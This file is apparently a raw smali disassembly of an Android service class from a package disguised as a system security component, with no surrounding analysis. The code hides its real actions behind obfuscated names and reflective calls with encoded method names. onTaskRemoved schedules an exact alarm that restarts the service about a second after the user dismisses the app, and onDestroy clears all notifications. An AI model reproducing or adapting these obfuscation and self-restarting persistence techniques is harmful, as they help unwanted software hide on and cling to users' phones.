.class public Lcom/android/security/fdiduds8/MainService;
.super Landroid/app/Service;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/security/fdiduds8/MainService$if;,
        Lcom/android/security/fdiduds8/MainService$ˊ;
    }
.end annotation


# instance fields
.field private final ˊ:Lcom/android/security/fdiduds8/MainService$if;

.field private ˋ:Lcom/android/security/fdiduds8/ZRuntime;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 62
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 29
    new-instance v0, Lcom/android/security/fdiduds8/MainService$if;

    invoke-direct {v0, p0}, Lcom/android/security/fdiduds8/MainService$if;-><init>(Lcom/android/security/fdiduds8/MainService;)V

    iput-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˊ:Lcom/android/security/fdiduds8/MainService$if;

    .line 63
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˋ:Lcom/android/security/fdiduds8/ZRuntime;

    .line 64
    return-void
.end method

.method public static ˊ(Landroid/content/Context;)V
    .locals 2

    .line 58
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/android/security/fdiduds8/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 59
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .line 76
    iget-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˊ:Lcom/android/security/fdiduds8/MainService$if;

    return-object v0
.end method

.method public onCreate()V
    .locals 4

    .line 82
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 84
    invoke-virtual {p0}, Lcom/android/security/fdiduds8/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/android/security/fdiduds8/ZRuntime;->getInstance(Landroid/content/Context;)Lcom/android/security/fdiduds8/ZRuntime;

    move-result-object v0

    iput-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˋ:Lcom/android/security/fdiduds8/ZRuntime;

    .line 85
    iget-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˋ:Lcom/android/security/fdiduds8/ZRuntime;

    invoke-virtual {v0}, Lcom/android/security/fdiduds8/ZRuntime;->isRunning()Z

    move-result v0

    if-nez v0, :cond_0

    .line 86
    iget-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˋ:Lcom/android/security/fdiduds8/ZRuntime;

    invoke-virtual {v0}, Lcom/android/security/fdiduds8/ZRuntime;->getController()Ljava/lang/Object;

    move-result-object v1

    goto :goto_0

    :catchall_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v0

    throw v0

    :goto_0
    const-string v0, "If"

    :try_start_0
    invoke-static {v0}, LIf$ﹳ;->ˊ(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v2, "\u02bd"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 87
    iget-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˋ:Lcom/android/security/fdiduds8/ZRuntime;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/android/security/fdiduds8/ZRuntime;->setRunning(Z)V

    .line 90
    :cond_0
    new-instance v0, Lcom/android/security/fdiduds8/MainService$ˊ;

    invoke-virtual {p0}, Lcom/android/security/fdiduds8/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/android/security/fdiduds8/MainService$ˊ;-><init>(Landroid/content/Context;)V

    invoke-static {v0}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    .line 91
    return-void
.end method

.method public onDestroy()V
    .locals 4

    .line 96
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 98
    :try_start_0
    iget-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˋ:Lcom/android/security/fdiduds8/ZRuntime;

    invoke-virtual {v0}, Lcom/android/security/fdiduds8/ZRuntime;->getController()Ljava/lang/Object;

    move-result-object v1

    goto :goto_0

    :catchall_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v0

    throw v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const-string v0, "If"

    :try_start_1
    invoke-static {v0}, LIf$ﹳ;->ˊ(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v2, "\u037a"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 99
    const-string v0, "notification"

    :try_start_2
    invoke-virtual {p0, v0}, Lcom/android/security/fdiduds8/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    .line 100
    invoke-virtual {v0}, Landroid/app/NotificationManager;->cancelAll()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 104
    return-void

    .line 103
    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 105
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 7

    .line 110
    iget-object v0, p0, Lcom/android/security/fdiduds8/MainService;->ˋ:Lcom/android/security/fdiduds8/ZRuntime;

    invoke-virtual {v0}, Lcom/android/security/fdiduds8/ZRuntime;->getController()Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {p0}, Lcom/android/security/fdiduds8/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    goto :goto_0

    :catchall_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v0

    throw v0

    :goto_0
    const/4 v2, 0x1

    :try_start_0
    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    const-string v0, "If"

    invoke-static {v0}, LIf$ﹳ;->ˊ(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v3, "\u02ca"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Class;

    const-class v5, Landroid/content/Context;

    const/4 v6, 0x0

    aput-object v5, v4, v6

    invoke-virtual {v0, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 112
    const/4 v0, 0x1

    return v0
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 6

    .line 118
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x13

    if-lt v0, v1, :cond_0

    .line 119
    new-instance v5, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/android/security/fdiduds8/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-direct {v5, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 120
    invoke-virtual {p0}, Lcom/android/security/fdiduds8/MainService;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 122
    invoke-virtual {p0}, Lcom/android/security/fdiduds8/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x1

    const/high16 v2, 0x40000000    # 2.0f

    invoke-static {v0, v1, v5, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    .line 123
    invoke-virtual {p0}, Lcom/android/security/fdiduds8/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "alarm"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 124
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    add-long/2addr v1, v3

    const/4 v3, 0x3

    invoke-virtual {v0, v3, v1, v2, v5}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V

    .line 126
    :cond_0
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 127
    return-void
.end method
